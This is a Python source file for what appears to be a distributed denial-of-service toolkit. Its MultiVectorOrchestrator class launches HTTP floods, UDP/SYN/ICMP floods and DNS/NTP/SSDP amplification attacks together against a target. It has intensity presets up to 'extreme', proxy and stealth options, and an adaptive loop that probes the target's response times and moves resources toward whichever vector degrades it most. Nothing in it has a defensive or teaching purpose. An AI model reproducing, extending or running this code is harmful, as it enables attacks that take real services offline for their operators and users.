import asyncio
import time
import random
import threading
from typing import Dict, Any, Optional, List
import concurrent.futures

class MultiVectorOrchestrator:
    """
    Advanced multi-vector attack orchestration system.
    Coordinates multiple attack types simultaneously for maximum impact.
    """

    def __init__(self, target: str, intensity: str = "high", adaptive_mode: bool = False,
                 duration: int = 0, proxy_manager: Any = None, stealth_mode: bool = False):
        self.target = target
        self.intensity = intensity
        self.adaptive_mode = adaptive_mode
        self.duration = duration
        self.proxy_manager = proxy_manager
        self.stealth_mode = stealth_mode

        # Attack configuration based on intensity
        self.intensity_configs = {
            "low": {
                "l7_workers": 5,
                "l4_threads": 10,
                "amp_threads": 5,
                "l7_rate": 100,
                "l4_packet_size": 512,
                "attack_distribution": [0.4, 0.3, 0.3]  # L7, L4, AMP ratios
            },
            "medium": {
                "l7_workers": 15,
                "l4_threads": 30,
                "amp_threads": 15,
                "l7_rate": 500,
                "l4_packet_size": 1024,
                "attack_distribution": [0.5, 0.3, 0.2]
            },
            "high": {
                "l7_workers": 25,
                "l4_threads": 50,
                "amp_threads": 25,
                "l7_rate": 1000,
                "l4_packet_size": 2048,
                "attack_distribution": [0.4, 0.4, 0.2]
            },
            "extreme": {
                "l7_workers": 50,
                "l4_threads": 100,
                "amp_threads": 50,
                "l7_rate": 2000,
                "l4_packet_size": 4096,
                "attack_distribution": [0.3, 0.4, 0.3]
            }
        }

        # Attack state
        self.attack_active = False
        self.attack_tasks = []
        self.attack_results = {}
        self.start_time = 0.0

        # Adaptive features
        self.target_response_times = []
        self.attack_effectiveness = {}
        self.vector_adjustments = {}

        # Get configuration for selected intensity
        self.config = self.intensity_configs.get(intensity, self.intensity_configs["high"])

    def _assess_target_vulnerability(self) -> Dict[str, float]:
        """Assess target vulnerability to different attack vectors."""
        # This would typically involve reconnaissance
        # For demo, we'll use simulated vulnerability assessment

        vulnerabilities = {
            "l7": random.uniform(0.3, 0.9),    # HTTP services are often vulnerable
            "l4": random.uniform(0.4, 0.8),    # Network layer often exposed
            "amp": random.uniform(0.2, 0.7)    # Depends on misconfigurations
        }

        # Normalize to sum to 1.0
        total = sum(vulnerabilities.values())
        if total > 0:
            vulnerabilities = {k: v/total for k, v in vulnerabilities.items()}

        return vulnerabilities

    def _calculate_optimal_distribution(self) -> List[float]:
        """Calculate optimal attack distribution based on target assessment."""
        if not self.adaptive_mode:
            return self.config["attack_distribution"]

        # Assess target vulnerabilities
        vulnerabilities = self._assess_target_vulnerability()

        # Calculate effectiveness scores
        base_distribution = self.config["attack_distribution"]
        adaptive_distribution = []

        for i, (vector, vuln_score) in enumerate(vulnerabilities.items()):
            # Weight by both base distribution and vulnerability
            adaptive_weight = (base_distribution[i] * 0.6) + (vuln_score * 0.4)
            adaptive_distribution.append(adaptive_weight)

        # Normalize
        total = sum(adaptive_distribution)
        if total > 0:
            adaptive_distribution = [w/total for w in adaptive_distribution]

        return adaptive_distribution

    async def _launch_l7_vector(self, distribution_weight: float) -> Dict[str, Any]:
        """Launch Layer 7 attack vector."""
        from .attack_orchestrator import AttackOrchestrator

        # Adjust workers based on distribution weight
        workers = max(1, int(self.config["l7_workers"] * distribution_weight))

        print(f"🌐 Launching L7 vector with {workers} workers")

        orchestrator = AttackOrchestrator(
            target_url=self.target,
            method="GET",  # Default method
            rate=self.config["l7_rate"],
            workers=workers,
            proxy_manager=self.proxy_manager,
            duration=self.duration,
            stealth_mode=self.stealth_mode
        )

        try:
            await orchestrator.start_attack()
            return {"vector": "l7", "status": "success", "workers": workers}
        except Exception as e:
            return {"vector": "l7", "status": "error", "error": str(e)}

    async def _launch_l4_vector(self, distribution_weight: float) -> Dict[str, Any]:
        """Launch Layer 4 attack vector."""
        from .layer4_attacks import Layer4AttackManager

        # Adjust threads based on distribution weight
        threads = max(1, int(self.config["l4_threads"] * distribution_weight))

        print(f"🌊 Launching L4 vector with {threads} threads")

        # Choose random L4 method
        methods = ["udp", "syn", "icmp"]
        method = random.choice(methods)

        l4_manager = Layer4AttackManager(
            target_ip=self.target.split('://')[-1].split('/')[0],  # Extract IP/domain
            method=method,
            threads=threads,
            packet_size=self.config["l4_packet_size"],
            duration=self.duration,
            stealth_mode=self.stealth_mode
        )

        try:
            result = l4_manager.start_attack()
            return {"vector": "l4", "status": "success", "method": method, "threads": threads}
        except Exception as e:
            return {"vector": "l4", "status": "error", "error": str(e)}

    async def _launch_amplification_vector(self, distribution_weight: float) -> Dict[str, Any]:
        """Launch amplification attack vector."""
        from .amplification_attacks import AmplificationAttackManager

        # Adjust threads based on distribution weight
        threads = max(1, int(self.config["amp_threads"] * distribution_weight))

        print(f"📡 Launching amplification vector with {threads} threads")

        # Choose random amplification method
        methods = ["dns", "ntp", "ssdp"]
        method = random.choice(methods)

        amp_manager = AmplificationAttackManager(
            target=self.target.split('://')[-1].split('/')[0],  # Extract IP/domain
            method=method,
            duration=self.duration,
            stealth_mode=self.stealth_mode
        )

        try:
            result = amp_manager.start_attack()
            return {"vector": "amplification", "status": "success", "method": method, "threads": threads}
        except Exception as e:
            return {"vector": "amplification", "status": "error", "error": str(e)}

    def _monitor_target_response(self):
        """Monitor target response times for adaptive adjustments."""
        import socket
        import time

        while self.attack_active:
            try:
                start_time = time.time()

                # Simple connectivity check
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5.0)

                try:
                    target_host = self.target.split('://')[-1].split('/')[0]
                    if ':' in target_host:
                        host, port = target_host.split(':')
                        port = int(port)
                    else:
                        host = target_host
                        port = 80

                    sock.connect((host, port))
                    response_time = (time.time() - start_time) * 1000  # ms

                    self.target_response_times.append(response_time)

                    # Keep only recent measurements
                    if len(self.target_response_times) > 100:
                        self.target_response_times = self.target_response_times[-100:]

                except:
                    # Target is down or unresponsive
                    self.target_response_times.append(float('inf'))
                finally:
                    sock.close()

            except Exception as e:
                print(f"Response monitoring error: {e}")

            time.sleep(2.0)  # Check every 2 seconds

    def _calculate_vector_effectiveness(self) -> Dict[str, float]:
        """Calculate effectiveness of each attack vector."""
        effectiveness = {}

        # Calculate based on response time degradation
        if len(self.target_response_times) >= 10:
            recent_responses = self.target_response_times[-10:]
            avg_response = sum(r for r in recent_responses if r != float('inf')) / len([r for r in recent_responses if r != float('inf')])

            # Higher response times indicate more effective attacks
            if avg_response > 1000:  # 1 second threshold
                effectiveness["l7"] = 0.8
                effectiveness["l4"] = 0.7
                effectiveness["amplification"] = 0.6
            elif avg_response > 500:  # 500ms threshold
                effectiveness["l7"] = 0.6
                effectiveness["l4"] = 0.5
                effectiveness["amplification"] = 0.4
            else:
                effectiveness["l7"] = 0.3
                effectiveness["l4"] = 0.3
                effectiveness["amplification"] = 0.2

        return effectiveness

    def _adjust_attack_distribution(self):
        """Adjust attack distribution based on effectiveness."""
        if not self.adaptive_mode:
            return

        effectiveness = self._calculate_vector_effectiveness()

        if effectiveness:
            # Shift resources toward more effective vectors
            total_effectiveness = sum(effectiveness.values())
            if total_effectiveness > 0:
                new_distribution = [
                    effectiveness.get("l7", 0.33) / total_effectiveness,
                    effectiveness.get("l4", 0.33) / total_effectiveness,
                    effectiveness.get("amplification", 0.33) / total_effectiveness
                ]

                # Smooth changes to avoid instability
                current_dist = self.config["attack_distribution"]
                smoothed_dist = [
                    current_dist[i] * 0.7 + new_dist[i] * 0.3
                    for i, new_dist in enumerate(new_distribution)
                ]

                self.config["attack_distribution"] = smoothed_dist
                print(f"🔄 Adjusted distribution: {smoothed_dist}")

    async def start_multi_vector_attack(self) -> Dict[str, Any]:
        """Start multi-vector attack with all attack types."""
        print("⚡ Starting Multi-Vector Attack...")
        print(f"Target: {self.target}")
        print(f"Intensity: {self.intensity}")
        print(f"Adaptive Mode: {'Enabled' if self.adaptive_mode else 'Disabled'}")

        self.attack_active = True
        self.start_time = time.time()

        # Calculate attack distribution
        distribution = self._calculate_optimal_distribution()
        print(f"Attack Distribution: L7={distribution[0]:.1%}, L4={distribution[1]:.1%}, AMP={distribution[2]:.1%}")

        # Start response monitoring for adaptive mode
        if self.adaptive_mode:
            monitor_thread = threading.Thread(target=self._monitor_target_response, daemon=True)
            monitor_thread.start()

        # Launch attack vectors concurrently
        attack_coroutines = [
            self._launch_l7_vector(distribution[0]),
            self._launch_l4_vector(distribution[1]),
            self._launch_amplification_vector(distribution[2])
        ]

        # Execute attacks
        try:
            results = await asyncio.gather(*attack_coroutines, return_exceptions=True)

            # Process results
            for i, result in enumerate(results):
                if isinstance(result, Exception):
                    vector_names = ["l7", "l4", "amplification"]
                    print(f"❌ {vector_names[i].upper()} attack failed: {result}")
                    self.attack_results[vector_names[i]] = {"status": "error", "error": str(result)}
                else:
                    self.attack_results[result["vector"]] = result
                    print(f"✅ {result['vector'].upper()} attack completed successfully")

        except KeyboardInterrupt:
            print("⚠️ Multi-vector attack interrupted by user")

        # Monitor and adjust in adaptive mode
        if self.adaptive_mode:
            adjustment_interval = 30  # seconds
            last_adjustment = time.time()

            try:
                while self.attack_active and (self.duration == 0 or (time.time() - self.start_time) < self.duration):
                    current_time = time.time()

                    # Periodic adjustments
                    if current_time - last_adjustment > adjustment_interval:
                        self._adjust_attack_distribution()
                        last_adjustment = current_time

                    # Update attack effectiveness metrics
                    effectiveness = self._calculate_vector_effectiveness()
                    if effectiveness:
                        self.attack_effectiveness.update(effectiveness)

                    time.sleep(5)

            except KeyboardInterrupt:
                print("⚠️ Attack monitoring interrupted")

        # Stop attack
        self.attack_active = False

        # Calculate final statistics
        total_duration = time.time() - self.start_time
        successful_vectors = len([r for r in self.attack_results.values() if r.get("status") == "success"])

        result = {
            "attack_type": "multi_vector",
            "target": self.target,
            "intensity": self.intensity,
            "adaptive_mode": self.adaptive_mode,
            "duration": total_duration,
            "successful_vectors": successful_vectors,
            "total_vectors": 3,
            "vector_results": self.attack_results,
            "final_distribution": distribution,
            "effectiveness_metrics": self.attack_effectiveness
        }

        print("✅ Multi-vector attack completed!")
        print(f"📊 Vectors successful: {successful_vectors}/3")
        if self.adaptive_mode:
            print(f"🎯 Final effectiveness: {self.attack_effectiveness}")

        return result

    def stop_attack(self):
        """Stop the multi-vector attack."""
        print("🛑 Stopping multi-vector attack...")
        self.attack_active = False
